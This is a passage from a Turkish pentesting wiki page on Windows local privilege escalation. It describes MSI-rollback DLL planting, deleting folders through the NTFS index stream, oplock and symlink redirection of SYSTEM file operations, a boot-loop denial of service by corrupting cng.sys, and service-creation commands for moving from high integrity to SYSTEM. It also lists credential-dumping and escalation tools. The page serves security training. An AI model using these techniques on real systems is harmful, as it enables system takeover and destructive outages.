        - `.rbf` dosyanızı (kötücül DLL) ayrıcalıklı bir konuma geri yüklemek (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - **Kötücül SYSTEM seviyesinde payload DLL** içeren sahte `.rbf` dosyanızı bırakın.

- Adım 12: Rollback'i tetikleyin
    - Installer'ın devam etmesi için sync event'ini bildirin.
    - **Type 19 custom action (`ErrorOut`)**, install işlemini bilinen bir noktada **kasten başarısız** kılacak şekilde yapılandırılmıştır.
    - Böylece **rollback başlar**.

- Adım 13: SYSTEM DLL'inizi yükler
    - Windows Installer:
        - Kötücül `.rbs` dosyanızı okur.
        - `.rbf` DLL'inizi hedef konuma kopyalar.
    - Artık **SYSTEM tarafından yüklenen bir path içinde kötücül DLL'iniz** vardır.

- Son Adım: SYSTEM kodunu çalıştırın
    - Hijack ettiğiniz DLL'i yükleyen güvenilir bir **auto-elevated binary** (ör. `osk.exe`) çalıştırın.
    - **Boom**: Kodunuz **SYSTEM olarak** çalıştırılır.


### Arbitrary File Delete/Move/Rename'den SYSTEM EoP'ye

Ana MSI rollback tekniği (bir önceki teknik), **tüm bir klasörü** (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki ya vulnerability'niz yalnızca **arbitrary file deletion** sağlıyorsa?

**NTFS internals**'ı kullanabilirsiniz: her klasörün şu adlı gizli bir alternate data stream'i vardır:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Bu stream, klasörün **indeks metadata**sını saklar.

Dolayısıyla, bir klasörün **`::$INDEX_ALLOCATION` stream**'ini **silerseniz**, NTFS **klasörün tamamını** dosya sisteminden kaldırır.

Bunu şu standart dosya silme API'leriyle yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Bir *file* silme API'sini çağırıyor olsanız da **klasörün kendisini siler**.

### Klasör İçeriğini Silmeden SYSTEM EoP'ye
Primitive'iniz rastgele dosya/klasörleri silmenize izin vermiyor, ancak saldırganın kontrolündeki bir klasörün *içeriğini* silmenize **izin veriyorsa** ne olur?

1. Adım 1: Bir tuzak klasör ve dosya oluşturun
- Oluşturun: `C:\temp\folder1`
- İçine şunu ekleyin: `C:\temp\folder1\file1.txt`

2. Adım 2: `file1.txt` üzerinde bir **oplock** ayarlayın
- Ayrıcalıklı bir süreç `file1.txt` dosyasını silmeye çalıştığında oplock **yürütmeyi duraklatır**.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Step 3: SYSTEM process'ini tetikle (örn. `SilentCleanup`)
- Bu process klasörleri (örn. `%TEMP%`) tarar ve içeriklerini silmeye çalışır.
- `file1.txt` dosyasına ulaştığında **oplock tetiklenir** ve kontrolü callback'inize devreder.

4. Step 4: Oplock callback içinde — silme işlemini yönlendir

- Option A: `file1.txt` dosyasını başka bir yere taşı
    - Bu, oplock'i bozmadan `folder1` klasörünü boşaltır.
    - `file1.txt` dosyasını doğrudan silmeyin — bu, oplock'i vaktinden önce serbest bırakır.

- Option B: `folder1` klasörünü bir **junction**'a dönüştürün:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Seçenek C: `\RPC Control` içinde bir **symlink** oluştur:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Bu, klasör meta verilerini depolayan NTFS dahili akışını hedefler — bu akışı silmek klasörü siler.

5. Adım 5: Oplock’u serbest bırakın
- SYSTEM işlemi devam eder ve `file1.txt` dosyasını silmeye çalışır.
- Ancak artık junction + symlink nedeniyle aslında sildiği şey:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Sonuç**: `C:\Config.Msi`, SYSTEM tarafından silinir.

### Rastgele Bir Klasör Oluşturmadan Kalıcı DoS'a

**Rastgele bir klasörü SYSTEM/admin olarak oluşturmanı** sağlayan bir primitive'den yararlan — **dosya yazamasan** veya **zayıf izinler ayarlayamasan** bile.

**Kritik bir Windows driver'ının** adıyla bir **klasör** (dosya değil) oluştur; örneğin:
```
C:\Windows\System32\cng.sys
```

- Bu yol normalde `cng.sys` kernel-mode driver'ına karşılık gelir.
- **Önceden klasör olarak oluşturursanız**, Windows açılışta gerçek driver'ı yükleyemez.
- Ardından Windows, açılış sırasında `cng.sys` dosyasını yüklemeye çalışır.
- Klasörü görür, **gerçek driver'ı bulamaz** ve **çöker veya açılışı durdurur**.
- Harici müdahale (ör. boot repair veya disk erişimi) olmadan **fallback yoktur** ve **kurtarma mümkün değildir**.

### Ayrıcalıklı log/backup yollarından ve OM symlink'lerinden keyfi dosya üzerine yazma / boot DoS'a

**Ayrıcalıklı bir service**, **yazılabilir bir config** dosyasından okuduğu yola log/export yazdığında, bu yolu **Object Manager symlink'leri + NTFS mount point'leri** ile yönlendirerek ayrıcalıklı yazma işlemini keyfi dosya üzerine yazmaya dönüştürün (SeCreateSymbolicLinkPrivilege olmadan bile).<sup>[[15]](#references)</sup>

**Gereksinimler**
- Hedef yolu içeren config dosyası saldırgan tarafından yazılabilir olmalı (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` konumuna bir mount point ve bir OM file symlink oluşturabilme yeteneği (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Bu yola yazan ayrıcalıklı bir işlem (log, export, report).

**Örnek zincir**
1. Ayrıcalıklı log hedefini bulmak için config dosyasını okuyun. Örneğin, `C:\ProgramData\ICONICS\IcoSetup64.ini` içindeki `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. Yolu admin olmadan yönlendirin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Ayrıcalıklı bileşenin log'u yazmasını bekleyin (ör. admin “send test SMS” tetikler). Yazma artık `C:\Windows\System32\cng.sys` konumuna yapılır.
4. Bozulan hedefi (hex/PE parser) inceleyerek bozulmayı doğrulayın; yeniden başlatma, Windows'un değiştirilmiş driver yolunu yüklemesine neden olur → **boot loop DoS**. Bu yöntem, ayrıcalıklı bir service'in yazmak için açacağı korumalı herhangi bir dosyaya da uygulanabilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` konumundan yüklenir, ancak `C:\Windows\System32\cng.sys` konumunda bir kopya varsa önce bu kopya denenebilir. Böylece bozuk veriler için güvenilir bir DoS hedefi hâline gelir.



## **High Integrity'den System'e**

### **Yeni service**

Zaten bir High Integrity process içinde çalışıyorsanız, **SYSTEM'e giden yol** yeni bir service **oluşturup çalıştırmak** kadar kolay olabilir:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Bir service binary oluştururken bunun geçerli bir service olduğundan veya gerekli işlemleri hızlıca gerçekleştirdiğinden emin olun; geçerli bir service değilse 20 saniye içinde sonlandırılır.

### AlwaysInstallElevated

High Integrity bir process'ten **AlwaysInstallElevated registry girdilerini etkinleştirmeyi** ve bir _**.msi**_ wrapper kullanarak bir reverse shell **kurmayı** deneyebilirsiniz.\
[İlgili registry key'leri ve bir _.msi_ paketinin nasıl kurulacağı hakkında daha fazla bilgi burada.](#alwaysinstallelevated)

### High + SeImpersonate ayrıcalığından System'e

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate'ten Full Token ayrıcalıklarına

Bu token ayrıcalıklarına sahipseniz (muhtemelen bunu zaten High Integrity olan bir process'te bulursunuz), SeDebug ayrıcalığıyla **neredeyse her process'i** (korumalı process'ler hariç) **açabilir**, process'in **token'ını kopyalayabilir** ve bu token'la **herhangi bir process oluşturabilirsiniz**.\
Bu teknik genellikle **tüm token ayrıcalıklarına sahip, SYSTEM olarak çalışan herhangi bir process'i seçmek için kullanılır** (_evet, tüm token ayrıcalıklarına sahip olmayan SYSTEM process'leri bulabilirsiniz_).\
**Önerilen tekniği uygulayan bir** [**kod örneğini burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik, meterpreter tarafından `getsystem` içinde privilege escalation için kullanılır. Teknik, **bir pipe oluşturup ardından bu pipe'a yazması için bir service oluşturmayı/kötüye kullanmayı** içerir. Pipe'ı **`SeImpersonate`** ayrıcalığını kullanarak oluşturan **server**, pipe istemcisinin (service'in) **token'ını taklit ederek** SYSTEM ayrıcalıklarını elde edebilir.\
[**Name pipe'lar hakkında daha fazla bilgi edinmek istiyorsanız bunu okuyun**](#named-pipe-client-impersonation).\
[**Name pipe'ları kullanarak high integrity'den System'e nasıl geçileceğine dair bir örnek okumak istiyorsanız bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM** olarak çalışan bir **process** tarafından **yüklenen** bir **dll'yi hijack** edebilirseniz, bu izinlerle rastgele kod çalıştırabilirsiniz. Bu nedenle Dll Hijacking bu tür privilege escalation için de kullanışlıdır. Ayrıca, dll'leri yüklemek için kullanılan klasörlerde **yazma izinlerine** sahip olacağından, bunu **high integrity bir process'ten gerçekleştirmek çok daha kolaydır**.\
**Dll hijacking hakkında daha fazla bilgi edinmek için** [**buraya bakabilirsiniz**](dll-hijacking/index.html)**.**

### **Administrator veya Network Service'ten System'e**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE veya NETWORK SERVICE'ten tam ayrıcalıklara

**Okuyun:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Kullanışlı araçlar

**Windows local privilege escalation vektörlerini bulmak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol eder (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Olası yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP için kaydedilmiş oturum bilgilerini çıkarır. Yerel ortamda -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan kimlik bilgilerini çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları domain genelinde dener**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, PowerShell tabanlı bir ADIDNS/LLMNR/mDNS spoofing ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel Windows privesc enumeration aracı**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc zafiyetlerini arar (Watson nedeniyle KULLANIMDAN KALDIRILDI)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Admin hakları gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc zafiyetlerini arar (VisualStudio kullanılarak derlenmesi gerekir) ([**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları aramak için host'u enumerate eder (privesc'ten çok bilgi toplama aracıdır) (derlenmesi gerekir) **(**[**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Çok sayıda yazılımdan kimlik bilgilerini çıkarır (GitHub'da önceden derlenmiş exe bulunur)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C#'a port edilmiş sürümü**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Yanlış yapılandırmaları kontrol eder (GitHub'da önceden derlenmiş executable bulunur). Önerilmez. Win10'da iyi çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (Python'dan exe). Önerilmez. Win10'da iyi çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderi temel alınarak oluşturulmuş araç (düzgün çalışması için accesschk erişimi gerekmez, ancak kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (yerel Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (yerel Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümünü kullanarak derlemeniz gerekir ([buraya bakın](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Kurban host'ta yüklü .NET sürümünü görmek için şunu çalıştırabilirsiniz:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows Yetki Yükseltmenin Temelleri](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Zayıf klasör izinlerinden yararlanarak yetki yükseltme](http://www.greyhathacker.net/?p=738)
- [3] [Windows Yetki Yükseltme - kısa başvuru kılavuzu](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Yerel Yetki Yükseltme Atölyesi](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Saldırıları: AT yeni siyah (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Yetki Yükseltme - Windows - Kapsamlı OSCP Kılavuzu](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Yetki Yükseltme - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Yetki Yükseltme Kılavuzu](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows Yetki Yükseltme kontrol listesi](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows Yetki Yükseltme](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester'lar için Windows Yetki Yükseltme Yöntemleri](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA makrosuyla phishing → hMailServer kimlik bilgilerinin şifresini çözme → SYSTEM için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token hırsızlığı](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox'un Peşinde: Kernel Gölgelerinde Kedi-Fare Oyunu](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Bir SCADA Sisteminde Bulunan Ayrıcalıklı Dosya Sistemi Güvenlik Açığı](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Test Araçları – CreateSymlink kullanımı](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Geçmişe Açılan Bir Bağlantı: Windows'ta Symbolic Link'lerden Yararlanma](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF portu)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Güven Aksaklıkları: Windows'ta Tehlikeli Modül Çözümlemesi](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modülleri: `node_modules` klasörlerinden yükleme](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ kontrol listesi zorlukları, çözümleri](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues işlevi](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop ile Pwn2Own: Windows LPE için CLDFLT ve DirectX Kernel Race Condition'larını zincirleme](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Hepsine Hükmedecek Tek I/O Ring: Windows 11'de Tam Okuma/Yazma Exploit Primitifi](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Yetki Yükseltmek ve Diğer Harika Hileler için Keyfi Dosya Silme İşlemlerinden Yararlanma](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit kodu](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Saldırıları Bölüm 2: CVE-2020-1013, Windows 10'da Yerel Yetki Yükseltme için 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager ve Windows Vault'u İnceleme](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Bir Görüntü Değişikliğinin Yetki Yükseltmeye Yol Açtığı Kerberos Kaynak Tabanlı Kısıtlı Delegasyon](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent'tan Ssh Özel Anahtarlarını Çıkarma](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kurumsal Güncelleme Sunucularını Backdoor Fabrikalarına Dönüştürme (0_o) – Bölüm 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kurumsal Güncelleme Sunucularını Backdoor Fabrikalarına Dönüştürme (0_o) – Bölüm 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer Klasörünü Silerek Yetki Yükseltme](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: Adımlarınızı NT AUTHORITY\SYSTEM'e Kadar Geri İzleme](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Windows MIDI Services paylaşımlı bellek ofsetleri yetki yükseltme güvenlik duyurusu](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
